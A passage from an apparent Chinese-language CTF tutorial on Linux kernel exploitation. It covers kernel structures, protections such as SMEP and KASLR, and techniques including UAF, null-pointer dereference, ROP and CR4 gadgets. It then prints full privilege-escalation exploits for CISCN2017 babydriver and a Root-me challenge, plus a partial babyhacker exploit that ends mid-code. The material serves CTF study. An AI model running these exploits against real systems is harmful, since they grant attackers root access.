class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">termiox</span> *<span class="title">termiox</span>;</span>    <span class="comment">/* May be NULL for unsupported */</span></span><br><span class="line">    <span class="keyword">char</span> name[<span class="number">64</span>];</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">pgrp</span>;</span>        <span class="comment">/* Protected by ctrl lock */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pid</span> *<span class="title">session</span>;</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> flags;</span><br><span class="line">    <span class="keyword">int</span> count;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">winsize</span> <span class="title">winsize</span>;</span>        <span class="comment">/* winsize_mutex */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> stopped:<span class="number">1</span>,    <span class="comment">/* flow_lock */</span></span><br><span class="line">              flow_stopped:<span class="number">1</span>,</span><br><span class="line">              unused:BITS_PER_LONG - <span class="number">2</span>;</span><br><span class="line">    <span class="keyword">int</span> hw_stopped;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ctrl_status:<span class="number">8</span>,    <span class="comment">/* ctrl_lock */</span></span><br><span class="line">              packet:<span class="number">1</span>,</span><br><span class="line">              unused_ctrl:BITS_PER_LONG - <span class="number">9</span>;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> receive_room;    <span class="comment">/* Bytes free for queue */</span></span><br><span class="line">    <span class="keyword">int</span> flow_change;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> *<span class="title">link</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">fasync_struct</span> *<span class="title">fasync</span>;</span></span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> write_wait;</span><br><span class="line">    <span class="keyword">wait_queue_head_t</span> read_wait;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">hangup_work</span>;</span></span><br><span class="line">    <span class="keyword">void</span> *disc_data;</span><br><span class="line">    <span class="keyword">void</span> *driver_data;</span><br><span class="line">    <span class="keyword">spinlock_t</span> files_lock;        <span class="comment">/* protects tty_files list */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">tty_files</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> N_TTY_BUF_SIZE 4096</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> closing;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *write_buf;</span><br><span class="line">    <span class="keyword">int</span> write_cnt;</span><br><span class="line">    <span class="comment">/* If the tty has a pending do_SAK, queue it here - akpm */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">work_struct</span> <span class="title">SAK_work</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_port</span> *<span class="title">port</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 下面开始，pwn 手天堂*/</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">tty_operations</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">tty_struct</span> * (*<span class="title">lookup</span>)(<span class="title">struct</span> <span class="title">tty_driver</span> *<span class="title">driver</span>,</span></span><br><span class="line"><span class="class">            <span class="title">struct</span> <span class="title">file</span> *<span class="title">filp</span>, <span class="title">int</span> <span class="title">idx</span>);</span></span><br><span class="line">    <span class="keyword">int</span>  (*install)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*remove)(struct tty_driver *driver, struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*open)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*close)(struct tty_struct * tty, struct file * filp);</span><br><span class="line">    <span class="keyword">void</span> (*shutdown)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*cleanup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write)(struct tty_struct * tty,</span><br><span class="line">              <span class="keyword">const</span> <span class="keyword">unsigned</span> <span class="keyword">char</span> *buf, <span class="keyword">int</span> count);</span><br><span class="line">    <span class="keyword">int</span>  (*put_char)(struct tty_struct *tty, <span class="keyword">unsigned</span> <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">void</span> (*flush_chars)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*write_room)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span>  (*chars_in_buffer)(struct tty_struct *tty);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 我们一般会劫持这个 ioctl</span></span><br><span class="line">    <span class="keyword">int</span>  (*ioctl)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">long</span> (*compat_ioctl)(struct tty_struct *tty,</span><br><span class="line">                 <span class="keyword">unsigned</span> <span class="keyword">int</span> cmd, <span class="keyword">unsigned</span> <span class="keyword">long</span> arg);</span><br><span class="line">    <span class="keyword">void</span> (*set_termios)(struct tty_struct *tty, struct ktermios * old);</span><br><span class="line">    <span class="keyword">void</span> (*throttle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*unthrottle)(struct tty_struct * tty);</span><br><span class="line">    <span class="keyword">void</span> (*stop)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*start)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*hangup)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*break_ctl)(struct tty_struct *tty, <span class="keyword">int</span> state);</span><br><span class="line">    <span class="keyword">void</span> (*flush_buffer)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*set_ldisc)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">void</span> (*wait_until_sent)(struct tty_struct *tty, <span class="keyword">int</span> timeout);</span><br><span class="line">    <span class="keyword">void</span> (*send_xchar)(struct tty_struct *tty, <span class="keyword">char</span> ch);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmget)(struct tty_struct *tty);</span><br><span class="line">    <span class="keyword">int</span> (*tiocmset)(struct tty_struct *tty,</span><br><span class="line">            <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="built_in">set</span>, <span class="keyword">unsigned</span> <span class="keyword">int</span> clear);</span><br><span class="line">    <span class="keyword">int</span> (*resize)(struct tty_struct *tty, struct winsize *ws);</span><br><span class="line">    <span class="keyword">int</span> (*set_termiox)(struct tty_struct *tty, struct termiox *tnew);</span><br><span class="line">    <span class="keyword">int</span> (*get_icount)(struct tty_struct *tty,</span><br><span class="line">                struct serial_icounter_struct *icount);</span><br><span class="line">    <span class="keyword">void</span> (*show_fdinfo)(struct tty_struct *tty, struct seq_file *m);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_CONSOLE_POLL</span></span><br><span class="line">    <span class="keyword">int</span> (*poll_init)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> *options);</span><br><span class="line">    <span class="keyword">int</span> (*poll_get_char)(struct tty_driver *driver, <span class="keyword">int</span> line);</span><br><span class="line">    <span class="keyword">void</span> (*poll_put_char)(struct tty_driver *driver, <span class="keyword">int</span> line, <span class="keyword">char</span> ch);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">proc_fops</span>;</span></span><br><span class="line">&#125; __randomize_layout;</span><br></pre></td></tr></table></figure><h2 id="相关保护"><a href="#相关保护" class="headerlink" title="相关保护"></a>相关保护</h2><ol><li>smep: Supervisor Mode Execution Protection，当处理器处于 ring 0 模式，执行用户空间的代码会触发页错误。（在 arm 中该保护称为 PXN)</li><li>smap: Superivisor Mode Access Protection，类似于 smep，当处理器处于 ring 0 模式，访问用户空间的数据会触发页错误。</li><li>MMAP_MIN_ADDR：控制着mmap能够映射的最低内存地址，防止用户非法分配并访问低地址数据。</li><li>KASLR：Kernel Address Space Layout Randomization(内核地址空间布局随机化)，开启后，允许kernel image加载到VMALLOC区域的任何位置。</li><li>Canary, DEP, PIE, RELRO 等保护与用户态原理和作用相同。</li><li>/proc/kallsyms函数中将存放了大量关键的函数的真实地址，这是十分危险的，低版本内核也提供了一些保护措施如kptr_restrict保护，但是在4.15.*以上内核中，内核新增了一个保护机制，康康代码：</li></ol><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">kallsyms_show_value</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (kptr_restrict) &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">if</span> (kallsyms_for_perf())</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* fallthrough */</span></span><br><span class="line">    <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">if</span> (has_capability_noaudit(current, CAP_SYSLOG))</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    <span class="comment">/* fallthrough */</span></span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">kallsyms_for_perf</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> CONFIG_PERF_EVENTS</span></span><br><span class="line">    <span class="keyword">extern</span> <span class="keyword">int</span> sysctl_perf_event_paranoid;</span><br><span class="line">    <span class="keyword">if</span> (sysctl_perf_event_paranoid &lt;= <span class="number">1</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>要同时保证sysctl_perf_event_paranoid的值小于等于1才可以成功的查看/proc/kallsyms，而在默认情况下，这个标志量的值为2。</p><h2 id="相关考点"><a href="#相关考点" class="headerlink" title="相关考点"></a>相关考点</h2><h3 id="编写-shellcode-姑且这么叫"><a href="#编写-shellcode-姑且这么叫" class="headerlink" title="编写 shellcode(姑且这么叫)"></a>编写 shellcode(姑且这么叫)</h3><p><code>commit_creds(prepare_kernel_cred(0));</code>就是这个，在用户态利用一些内核模块（就是驱动）的问题，让他们在内核态执行这个，从而把当前进程的<code>/bin/sh</code>提权。</p><h3 id="Null-pointer-dereference"><a href="#Null-pointer-dereference" class="headerlink" title="Null pointer dereference"></a>Null pointer dereference</h3><p>这个也可以骚起来是我第一次听说，可以用mmap在0地址处来一段shellcode。</p><h3 id="UAF-in-Kernel"><a href="#UAF-in-Kernel" class="headerlink" title="UAF in Kernel"></a>UAF in Kernel</h3><p>如果用户态程序多次打开同一字符设备，线程安全要设备自身去保证，否则就不安全，就会造成 UAF，也叫条件竞争 UAF。</p><h3 id="ROP-Chain-in-Kernel"><a href="#ROP-Chain-in-Kernel" class="headerlink" title="ROP Chain in Kernel"></a>ROP Chain in Kernel</h3><p>构造通过 rop 执行 commit_creds(prepare_kernel_cred(0))；返回用户态，通过 system(“/bin/sh”) 等起 shell。</p><h3 id="整数溢出"><a href="#整数溢出" class="headerlink" title="整数溢出"></a>整数溢出</h3><p>就是普通的，整数溢出。</p><h3 id="Bypass-SEMP-kASLR"><a href="#Bypass-SEMP-kASLR" class="headerlink" title="Bypass SEMP/kASLR"></a>Bypass SEMP/kASLR</h3><p>内核是根据CR4寄存器的值来判断smep保护是否开启的，当CR4寄存器的第20位是1时，保护开启；是0时，保护关闭。那么，如果在内核中存在gadget能让我们修改CR4寄存器的值我们就可以手动来关闭SMEP保护了。</p><p>有kASLR可以先关掉泄露地址，再打开推测地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0xffffffff81004d70 : mov cr4, rdi ; pop rbp ; ret</span><br><span class="line">0xffffffff8109054d : pop rdi ; ret</span><br></pre></td></tr></table></figure><h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><h3 id="CISCN2017-babydriver-简单的-use-after-free"><a href="#CISCN2017-babydriver-简单的-use-after-free" class="headerlink" title="CISCN2017 - babydriver 简单的 use after free"></a>CISCN2017 - babydriver 简单的 use after free</h3><p>漏洞点是内核线程安全的uaf，直接放 exploit，比较好理解。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// 打开两次设备</span></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">"/dev/babydev"</span>, <span class="number">2</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span></span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0xa8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 释放 fd1</span></span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span></span><br><span class="line">    <span class="keyword">int</span> pid = fork();</span><br><span class="line">    <span class="keyword">if</span>(pid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">"[*] fork error!"</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(pid == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span></span><br><span class="line">        <span class="keyword">char</span> zeros[<span class="number">30</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">        write(fd2, zeros, <span class="number">28</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(getuid() == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">"[+] root now."</span>);</span><br><span class="line">            system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        wait(<span class="literal">NULL</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="Root-me-LinKern-x86-Null-Pointer-Dereference"><a href="#Root-me-LinKern-x86-Null-Pointer-Dereference" class="headerlink" title="[Root-me]LinKern x86 Null Pointer Dereference"></a>[Root-me]LinKern x86 Null Pointer Dereference</h3><p>我们的目标是调用commit_creds(prepare_kernel_cred(0))，那么我们的shellcode就是：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">xor eax,eax;</span><br><span class="line">call commit_creds;</span><br><span class="line">call prepare_kernel_cred;</span><br><span class="line">ret;</span><br></pre></td></tr></table></figure><p>其中commit_creds和prepare_kernel_cred函数的地址可以在/proc/kallsyms中定位到（由于这题什么保护都没开）。</p><p>所以也直接放 exploit，比较好懂：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 没有 pwntools 还是有点硬</span></span><br><span class="line"><span class="keyword">char</span> payload[] = <span class="string">"x31xc0xe8xe9x11x07xc1xe8x74x0ex07xc1xc3"</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> Get_shell[<span class="number">20</span>];</span><br><span class="line">    mmap(<span class="number">0</span>, <span class="number">4096</span>, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_FIXED | MAP_PRIVATE | MAP_ANONYMOUS, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(<span class="number">0</span>, payload, <span class="keyword">sizeof</span>(payload));</span><br><span class="line">    <span class="keyword">int</span> fd = open(<span class="string">"/dev/tostring"</span>,<span class="number">2</span>);</span><br><span class="line">    write(fd,<span class="string">"**********S"</span>,<span class="number">11</span>);</span><br><span class="line">    read(fd,Get_shell,<span class="keyword">sizeof</span>(Get_shell));</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="2020高校战疫分享赛-–-babyhacker-ROP-Chain-in-Kernel、整数溢出、Bypass-SEMP-kASLR"><a href="#2020高校战疫分享赛-–-babyhacker-ROP-Chain-in-Kernel、整数溢出、Bypass-SEMP-kASLR" class="headerlink" title="2020高校战疫分享赛 – babyhacker ROP Chain in Kernel、整数溢出、Bypass SEMP/kASLR"></a>2020高校战疫分享赛 – babyhacker ROP Chain in Kernel、整数溢出、Bypass SEMP/kASLR</h3><p>还是直接放 exploit，本题利用点是，整数溢出，传入-1可以在栈上写很长的内容，然后需要先得到canary，再去掉保护，还要关kASLR看地址，然后就是常规的ROP操作，开一个shell，再用<code>commit_creds(prepare_kernel_cred(0));</code>把它提权。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stropts.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span>&#123;</span></span><br><span class="line">    <span class="keyword">void</span> *rip;</span><br><span class="line">    <span class="keyword">uint64_t</span> cs;</span><br><span class="line">    <span class="keyword">uint64_t</span> rflags;</span><br><span class="line">    <span class="keyword">void</span> * rsp;</span><br><span class="line">    <span class="keyword">uint64_t</span> ss;</span><br><span class="line">&#125;__attribute__((packed));</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">trap_frame</span> <span class="title">tf</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">launch_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    execl(<span class="string">"/bin/sh"</span>,<span class="string">"sh"</span>,<span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">asm</span>(</span><br><span class="line">        <span class="string">"mov %%cs,  %0n"</span></span><br><span class="line">        <span class="string">"mov %%ss,  %1n"</span></span><br><span class="line">        <span class="string">"mov %%rsp, %3n"</span></span><br><span class="line">        <span class="string">"pushfqn"</span></span><br><span class="line">        <span class="string">"popq %2"</span> :<span class="string">"=r"</span>(tf.cs),<span class="string">"=r"</span>(tf.ss),<span class="string">"=r"</span>(tf.rflags),<span class="string">"=r"</span>(tf.rsp) :</span><br><span class="line">        :<span class="string">"memory"</span></span><br><span class="line">    );</span><br><span class="line">    tf.rsp -= <span class="number">4096</span>;</span><br><span class="line">    tf.rip = &amp;launch_shell;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> (*commit_creds)(<span class="keyword">uint64_t</span> cred) ;</span><br><span class="line"><span class="keyword">uint64_t</span> (*prepare_kernel_cred)(<span class="keyword">uint64_t</span> cred) ;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">payload</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    commit_creds(prepare_kernel_cred(<span class="number">0</span>));</span><br><span class="line">    <span class="keyword">asm</span>(<span class="string">"movq $tf, %rspn"</span></span><br><span class="line">        <span class="string">"swapgsn"</span></span><br><span class="line">        <span class="string">"iretqn"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> u64(<span class="keyword">char</span> * s)&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> result = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">7</span> ; i &gt;=<span class="number">0</span> ;i--)&#123;</span><br><span class="line">        result = (result &lt;&lt; <span class="number">8</span>) | (<span class="number">0x00000000000000ff</span> &amp; s[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> leak_value[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> Send_value[<span class="number">0x1000</span>];</span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">"/dev/babyhacker"</span>, O_RDONLY);</span><br><span class="line"></span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    ioctl(fd1, <span class="number">0x30000</span>, <span 